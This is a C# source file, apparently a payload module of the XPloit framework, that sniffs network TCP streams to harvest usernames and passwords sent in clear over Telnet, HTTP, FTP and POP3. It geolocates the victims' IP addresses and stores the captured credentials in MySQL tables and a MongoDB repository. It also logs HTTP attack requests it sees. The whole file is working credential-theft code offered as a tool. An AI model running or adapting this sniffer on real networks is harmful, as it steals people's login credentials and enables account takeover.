using MongoDB.Driver;
using MySql.Data.MySqlClient;
using PacketDotNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Data;
using System.Data.Common;
using System.Dynamic;
using XPloit.Core;
using XPloit.Core.Attributes;
using XPloit.Core.Enums;
using XPloit.Core.Helpers;
using XPloit.Core.Mongo;
using XPloit.Helpers;
using XPloit.Helpers.Attributes;
using XPloit.Helpers.Geolocate;
using XPloit.Sniffer.Enums;
using XPloit.Sniffer.Extractors;
using XPloit.Sniffer.Interfaces;
using XPloit.Sniffer.Streams;

namespace Payloads.Local.Sniffer
{
    [ModuleInfo(Author = "Fernando Díaz Toledano", Description = "Sniffer insecure protocols passwords")]
    public class DeepScan : Payload, Auxiliary.Local.Sniffer.IPayloadSniffer
    {
        #region Properties
        public bool CaptureOnTcpStream { get { return true; } }
        public bool CaptureOnPacket { get { return false; } }

        [ConfigurableProperty(Description = "Mongo repository url", Optional = true)]
        public XploitMongoRepository<Credential> Repository { get; set; }

        [ConfigurableProperty(Description = "Database - Type", Optional = true)]
        public EDbType DBType { get; set; }
        [ConfigurableProperty(Description = "Database - Connection string", Optional = true)]
        public string DBConnectionString { get; set; }

        [ConfigurableProperty(Description = "Write credentials as info")]
        public bool WriteAsInfo { get; set; }

        [ConfigurableProperty(Description = "Search for credencials")]
        public bool SearchCredentials { get; set; }
        [ConfigurableProperty(Description = "Search for attacks")]
        public bool SearchAttacks { get; set; }
        #endregion

        long hay = 0;
        Dictionary<Credential.ECredentialType, string> _LastCred = new Dictionary<Credential.ECredentialType, string>();
        IObjectExtractor[] _Checks = new IObjectExtractor[] { ExtractTelnet.Current, ExtractHttp.Current, ExtractFtpPop3.Current };
        DbConnection DB = null;

        public DeepScan()
        {
            SearchCredentials = true;
            SearchAttacks = true;
        }

        public void Start(object sender)
        {
            CleanDB();

            if (!string.IsNullOrEmpty(DBConnectionString))
            {
                DB = DBHelper.GetDB(DBType, DBConnectionString);
                DB.Open();
            }
        }
        public void Stop(object sender)
        {
            CleanDB();
            WriteInfo("Stream captured", hay.ToString(), ConsoleColor.Cyan);
        }

        void CleanDB()
        {
            if (DB != null)
            {
                DB.Close();
                DB.Dispose();
                DB = null;
            }
        }

        public bool Check()
        {
            Start(null);

            using (DBHelper.DbCommandEx cmd = new DBHelper.DbCommandEx(DB))
            {
                // -----
                if (!cmd.TableExists("hosts"))
                {
                    cmd.CommandText = @"
CREATE TABLE IF NOT EXISTS `hosts` (
  `ID` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `IP` varchar(40) CHARACTER SET latin1 NOT NULL DEFAULT '',
  `CONTINENT` char(2) CHARACTER SET latin1 NOT NULL DEFAULT '',
  `COUNTRY` char(2) NOT NULL DEFAULT '',
  `DATE_INS` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`ID`),
  UNIQUE KEY `IP_UNIQUE` (`IP`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
";
                    cmd.ExecuteNonQuery();
                    WriteInfo("Creating hosts table", "OK", ConsoleColor.Green);
                }
                if (!cmd.TableExists("credentials_http"))
                {
                    cmd.CommandText = @"
CREATE TABLE IF NOT EXISTS `credentials_http` (
  `HOST` bigint(20) NOT NULL,
  `PORT` smallint(5) unsigned NOT NULL,
  `TYPE` varchar(20) CHARACTER SET latin1 NOT NULL DEFAULT '',
  `USER` varchar(100) NOT NULL DEFAULT '',
  `PASS` varchar(100) NOT NULL DEFAULT '',
  `VALID` tinyint(4) NOT NULL DEFAULT '0',
  `DATE` date NOT NULL,
  `HOUR` char(5) CHARACTER SET latin1 NOT NULL DEFAULT '00:00',
  `HTTP_CRC` char(32) CHARACTER SET latin1 NOT NULL DEFAULT '',
  `HTTP_HOST` varchar(1000) NOT NULL DEFAULT '',
  `HTTP_URL` varchar(1000) NOT NULL DEFAULT '',
  PRIMARY KEY (`HTTP_CRC`,`HOUR`,`DATE`,`VALID`,`PASS`,`USER`,`TYPE`,`PORT`,`HOST`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
";
                    cmd.ExecuteNonQuery();
                    WriteInfo("Creating credentials_http table", "OK", ConsoleColor.Green);
                }                                                                                                                   // -----
                if (!cmd.TableExists("credentials_telnet"))
                {
                    cmd.CommandText = @"
CREATE TABLE IF NOT EXISTS `credentials_telnet` (
  `HOST` bigint(20) NOT NULL,
  `PORT` smallint(5) unsigned NOT NULL,
  `TYPE` varchar(20) CHARACTER SET latin1 NOT NULL DEFAULT '',
  `USER` varchar(100) NOT NULL DEFAULT '',
  `PASS` varchar(100) NOT NULL DEFAULT '',
  `VALID` tinyint(4) NOT NULL DEFAULT '0',
  `DATE` date NOT NULL,
  `HOUR` char(5) CHARACTER SET latin1 NOT NULL DEFAULT '00:00',
  PRIMARY KEY (`HOST`,`PORT`,`TYPE`,`USER`,`PASS`,`VALID`,`DATE`,`HOUR`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
";
                    cmd.ExecuteNonQuery();
                    WriteInfo("Creating credentials_telnet table", "OK", ConsoleColor.Green);
                }
                if (!cmd.TableExists("credentials_telnet"))
                {
                    cmd.CommandText = @"
CREATE TABLE IF NOT EXISTS `credentials_ftp` (
  `HOST` bigint(20) NOT NULL,
  `PORT` smallint(5) unsigned NOT NULL,
  `TYPE` varchar(20) CHARACTER SET latin1 NOT NULL DEFAULT '',
  `USER` varchar(100) NOT NULL DEFAULT '',
  `PASS` varchar(100) NOT NULL DEFAULT '',
  `VALID` tinyint(4) NOT NULL DEFAULT '0',
  `DATE` date NOT NULL,
  `HOUR` char(5) CHARACTER SET latin1 NOT NULL DEFAULT '00:00',
  PRIMARY KEY (`HOST`,`PORT`,`TYPE`,`USER`,`PASS`,`VALID`,`DATE`,`HOUR`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
";
                    cmd.ExecuteNonQuery();
                    WriteInfo("Creating credentials_ftp table", "OK", ConsoleColor.Green);
                }

                if (!cmd.TableExists("credentials_pop3"))
                {
                    cmd.CommandText = @"
CREATE TABLE IF NOT EXISTS `credentials_pop3` (
  `HOST` bigint(20) NOT NULL,
  `PORT` smallint(5) unsigned NOT NULL,
  `TYPE` varchar(20) CHARACTER SET latin1 NOT NULL DEFAULT '',
  `AUTH_TYPE` varchar(20) CHARACTER SET latin1 NOT NULL DEFAULT '',
  `USER` varchar(100) NOT NULL DEFAULT '',
  `PASS` varchar(100) NOT NULL DEFAULT '',
  `VALID` tinyint(4) NOT NULL DEFAULT '0',
  `DATE` date NOT NULL,
  `HOUR` char(5) CHARACTER SET latin1 NOT NULL DEFAULT '00:00',
  PRIMARY KEY (`DATE`,`HOUR`,`VALID`,`USER`,`PASS`,`AUTH_TYPE`,`TYPE`,`PORT`,`HOST`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
;";
                    cmd.ExecuteNonQuery();
                    WriteInfo("Creating credentials_pop3 table", "OK", ConsoleColor.Green);
                }

                if (!cmd.TableExists("attacks_http"))
                {
                    cmd.CommandText = @"
CREATE TABLE IF NOT EXISTS `attacks_http` (
  `HOST` bigint(20) NOT NULL,
  `PORT` smallint(5) unsigned NOT NULL,
  `TYPE` varchar(20) CHARACTER SET latin1 NOT NULL DEFAULT '',
  `DATE` date NOT NULL,
  `HOUR` char(5) CHARACTER SET latin1 NOT NULL DEFAULT '00:00',
  `HTTP_CRC` char(32) CHARACTER SET latin1 NOT NULL,
  `HTTP_HOST` varchar(200) NOT NULL DEFAULT '',
  `HTTP_URL` varchar(1000) NOT NULL DEFAULT '',
  `HTTP_QUERY` json NOT NULL,
  PRIMARY KEY (`HOST`,`PORT`,`TYPE`,`DATE`,`HOUR`,`HTTP_CRC`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
";
                    cmd.ExecuteNonQuery();
                    WriteInfo("Creating attacks_http table", "OK", ConsoleColor.Green);
                }
            }

            CleanDB();
            hay = 0;
            return true;
        }

        public void OnPacket(object sender, IPProtocolType protocolType, EthernetPacket packet) { }
        public void OnTcpStream(object sender, TcpStream stream, bool isNew, ConcurrentQueue<object> queue)
        {
            if (isNew) hay++;
            if (stream == null || stream.Count == 0) return;

            if (stream.Variables == null)
            {
                stream.Variables = new ExpandoObject();
                stream.Variables.Valid = new bool[] { true, true, true };
            }

            // Check
            bool some = false;
            try
            {
                for (int x = stream.Variables.Valid.Length - 1; x >= 0; x--)
                {
                    if (!stream.Variables.Valid[x]) continue;

                    object[] cred;
                    switch (_Checks[x].GetObjects(stream, out cred))
                    {
                        case EExtractorReturn.DontRetry:
                            {
                                stream.Variables.Valid[x] = false;
                                break;
                            }
                        case EExtractorReturn.Retry: some = true; break;
                        case EExtractorReturn.True:
                            {
                                stream.Dispose();

                                foreach (object c in cred)
                                    if (c != null)
                                    {
                                        if (c is Attack && !SearchAttacks) continue;
                                        if (c is Credential && !SearchCredentials) continue;

                                        queue.Enqueue(c);
                                    }

                                return;
                            }
                    }
                }
            }
            catch (Exception e)
            {
                WriteError(e.ToString());
            }

            if (!some)
                stream.Dispose();
        }
        public void Dequeue(object sender, object[] arr)
        {
            Dictionary<string, List<ICountryRecaller>> ls = new Dictionary<string, List<ICountryRecaller>>();

            foreach (object o in arr)
                if (o != null && o is ICountryRecaller)
                {
                    ICountryRecaller ic = (ICountryRecaller)o;
                    ic.RecallCounty(GeoLite2LocationProvider.Current);

                    List<ICountryRecaller> la;
                    string name = o.GetType().Name;
                    if (!ls.TryGetValue(name, out la))
                    {
                        la = new List<ICountryRecaller>();
                        ls.Add(name, la);
                    }

                    la.Add(ic);
                }

            // Console
            if (WriteAsInfo)
            {
                foreach (string key in ls.Keys)
                    foreach (ICountryRecaller o in ls[key])
                    {
                        string json = o.ToString();

                        if (!(o is Credential) || ((Credential)o).IsValid) WriteInfo(json);
                        else WriteError(json);
                    }
            }

            // Repository
            if (Repository != null)
                foreach (string key in ls.Keys)
                {
                    // Split repositories by type
                    IMongoCollection<ICountryRecaller> col = Repository.Database.GetCollection<ICountryRecaller>(key);

                    //foreach (ICountryRecaller ox in ls[key]) col.InsertOne(ox);
                    col.InsertMany(ls[key]);  // No va !
                }

            if (DB != null)
            {
                try
                {
                    if (DB.State != ConnectionState.Open)
                        Start(null);

                    using (DBHelper.DbCommandEx cmd = new DBHelper.DbCommandEx(DB))
                        foreach (string key in ls.Keys)
                            foreach (ICountryRecaller c in ls[key])
                                if (c is ExtractBase) Run((ExtractBase)c, cmd);
                }
                catch (Exception e)
                {
                    Start(null);
                    throw (e);
                }
            }
        }
        class HttpQuery
        {
            public string[] Post { get; set; }
            public string[] Get { get; set; }
        }
        static bool Run(ExtractBase item, DBHelper.DbCommandEx cmd)
        {
            if (item == null) return false;

            // Raise insert
            ulong id = GetHostId(cmd, item);

            if (item is HttpAttack) return InsertHttpAttack(cmd, id, (HttpAttack)item);
            else if (item is HttpCredential) return InsertHttpCredential(cmd, id, (HttpCredential)item);

            else if (item is TelnetCredential) return InsertTelnetCredential(cmd, id, (TelnetCredential)item);
            else if (item is Pop3Credential) return InsertPop3Credential(cmd, id, (Pop3Credential)item);
            else if (item is FTPCredential) return InsertFTPCredential(cmd, id, (FTPCredential)item);

            // Delete item
            return false;
        }
        static bool InsertFTPCredential(DBHelper.DbCommandEx cmd, ulong countryId, FTPCredential item)
        {
            lock (cmd)
            {
                cmd.Parameters.Clear();
                cmd.AddParameter("HOST", countryId);
                cmd.AddParameter("PORT", item.Port);
                cmd.AddParameter("TYPE", item.Type.ToString());
                cmd.AddParameter("DATE", item.Date.Substring(0, 10));
                cmd.AddParameter("HOUR", item.Date.Substring(11, 5));
                cmd.AddParameter("USER", NotNull(item.User));
                cmd.AddParameter("PASS", NotNull(item.Password));
                cmd.AddParameter("VALID", item.IsValid ? 1 : 0);
                cmd.CommandText = "INSERT IGNORE INTO credentials_ftp(HOST,PORT,TYPE,DATE,HOUR,USER,PASS,VALID)VALUES(@HOST,@PORT,@TYPE,@DATE,@HOUR,@USER,@PASS,@VALID);";
                cmd.ExecuteNonQuery();
                return true;
            }
        }
        static bool InsertPop3Credential(DBHelper.DbCommandEx cmd, ulong countryId, Pop3Credential item)
        {
            lock (cmd)
            {
                cmd.Parameters.Clear();
                cmd.AddParameter("HOST", countryId);
                cmd.AddParameter("PORT", item.Port);
                cmd.AddParameter("TYPE", item.Type.ToString());
                cmd.AddParameter("AUTH_TYPE", NotNull(item.AuthType));
                cmd.AddParameter("DATE", item.Date.Substring(0, 10));
                cmd.AddParameter("HOUR", item.Date.Substring(11, 5));
                cmd.AddParameter("USER", NotNull(item.User));
                cmd.AddParameter("PASS", NotNull(item.Password));
                cmd.AddParameter("VALID", item.IsValid ? 1 : 0);
                cmd.CommandText = "INSERT IGNORE INTO credentials_pop3(HOST,PORT,TYPE,AUTH_TYPE,DATE,HOUR,USER,PASS,VALID)VALUES(@HOST,@PORT,@TYPE,@AUTH_TYPE,@DATE,@HOUR,@USER,@PASS,@VALID);";
                cmd.ExecuteNonQuery();
                return true;
            }
        }
        static bool InsertTelnetCredential(DBHelper.DbCommandEx cmd, ulong countryId, TelnetCredential item)
        {
            lock (cmd)
            {
                cmd.Parameters.Clear();
                cmd.AddParameter("HOST", countryId);
                cmd.AddParameter("PORT", item.Port);
                cmd.AddParameter("TYPE", item.Type.ToString());
                cmd.AddParameter("DATE", item.Date.Substring(0, 10));
                cmd.AddParameter("HOUR", item.Date.Substring(11, 5));
                cmd.AddParameter("USER", NotNull(item.User));
                cmd.AddParameter("PASS", NotNull(item.Password));
                cmd.AddParameter("VALID", item.IsValid ? 1 : 0);
                cmd.CommandText = "INSERT IGNORE INTO credentials_telnet(HOST,PORT,TYPE,DATE,HOUR,USER,PASS,VALID)VALUES(@HOST,@PORT,@TYPE,@DATE,@HOUR,@USER,@PASS,@VALID);";
                cmd.ExecuteNonQuery();
                return true;
            }
        }
        static bool InsertHttpCredential(DBHelper.DbCommandEx cmd, ulong countryId, HttpCredential item)
        {
            string url = NotNull(item.HttpUrl);
            string host = NotNull(item.HttpHost);
            string crc = HashHelper.HashHex(HashHelper.EHashType.Md5, host + "\n" + url);

            lock (cmd)
            {
                cmd.Parameters.Clear();
                cmd.AddParameter("HOST", countryId);
                cmd.AddParameter("PORT", item.Port);
                cmd.AddParameter("TYPE", item.Type.ToString());
                cmd.AddParameter("DATE", item.Date.Substring(0, 10));
                cmd.AddParameter("HOUR", item.Date.Substring(11, 5));
                cmd.AddParameter("HTTP_CRC", crc);
                cmd.AddParameter("HTTP_URL", url);
                cmd.AddParameter("HTTP_HOST", host);
                cmd.AddParameter("USER", NotNull(item.User));
                cmd.AddParameter("PASS", NotNull(item.Password));
                cmd.AddParameter("VALID", item.IsValid ? 1 : 0);
                cmd.CommandText = "INSERT IGNORE INTO credentials_http(HOST,PORT,TYPE,HTTP_HOST,HTTP_URL,HTTP_CRC,DATE,HOUR,USER,PASS,VALID)VALUES(@HOST,@PORT,@TYPE,@HTTP_HOST,@HTTP_URL,@HTTP_CRC,@DATE,@HOUR,@USER,@PASS,@VALID);";
                cmd.ExecuteNonQuery();
                return true;
            }
        }
        static bool InsertHttpAttack(DBHelper.DbCommandEx cmd, ulong countryId, HttpAttack item)
        {
            HttpQuery d = new HttpQuery()
            {
                Post = item.Post,
                Get = item.Get
            };

            string query = JsonHelper.Serialize(d, false, false);
            string url = NotNull(item.HttpUrl);
            string host = NotNull(item.HttpHost);
            string crc = HashHelper.HashHex(HashHelper.EHashType.Md5, host + "\n" + url + "\n" + query);

            lock (cmd)
            {
                cmd.Parameters.Clear();
                cmd.AddParameter("HOST", countryId);
                cmd.AddParameter("PORT", item.Port);
                cmd.AddParameter("TYPE", item.Type.ToString());
                cmd.AddParameter("DATE", item.Date.Substring(0, 10));
                cmd.AddParameter("HOUR", item.Date.Substring(11, 5));
                cmd.AddParameter("HTTP_QUERY", query);
                cmd.AddParameter("HTTP_URL", url);
                cmd.AddParameter("HTTP_HOST", host);
                cmd.AddParameter("HTTP_CRC", crc);
                cmd.CommandText = "INSERT IGNORE INTO attacks_http(HOST,PORT,TYPE,DATE,HOUR,HTTP_HOST,HTTP_URL,HTTP_QUERY,HTTP_CRC)VALUES(@HOST,@PORT,@TYPE,@DATE,@HOUR,@HTTP_HOST,@HTTP_URL,@HTTP_QUERY,@HTTP_CRC);";
                cmd.ExecuteNonQuery();
                return true;
            }
        }

        static ulong GetHostId(DBHelper.DbCommandEx cmd, ExtractBase it)
        {
            object o;
            lock (cmd)
            {
                cmd.Parameters.Clear();
                cmd.AddParameter("i", it.Address);
                cmd.CommandText = "SELECT ID FROM hosts WHERE IP= @i";
                o = cmd.ExecuteScalar();

                // Exists
                if (o != null) return Convert.ToUInt64(o);

                // Not exists
                it.RecallCounty(GeoLite2LocationProvider.Current);

                try
                {
                    cmd.Parameters.Clear();
                    cmd.AddParameter("ip", it.Address);
                    cmd.AddParameter("cont", EnsureLength(it.Continent, 2, true));
                    cmd.AddParameter("count", EnsureLength(it.Country, 2, true));
                    cmd.CommandText = "INSERT INTO hosts(IP,CONTINENT,COUNTRY)VALUES( @ip , @cont , @count )";
                    cmd.ExecuteNonQuery();

                    cmd.Parameters.Clear();
                    cmd.CommandText = "SELECT LAST_INSERT_ID()";

                    o = cmd.ExecuteScalar();
                }
                catch (MySqlException e)
                {
                    // https://dev.mysql.com/doc/refman/5.6/en/error-messages-server.html
                    if (e.Number == 1022 || e.Number == 1062) return GetHostId(cmd, it);
                    throw (e);
                }
            }

            return Convert.ToUInt64(o);
        }
        static string NotNull(string input)
        {
            if (input == null) return "";
            return input;
        }
        static object EnsureLength(string input, int length, bool ifExcedEmpty)
        {
            if (string.IsNullOrEmpty(input)) return "";

            if (input.Length > length) return ifExcedEmpty ? "" : input.Substring(0, length);
            return input;
        }
    }
}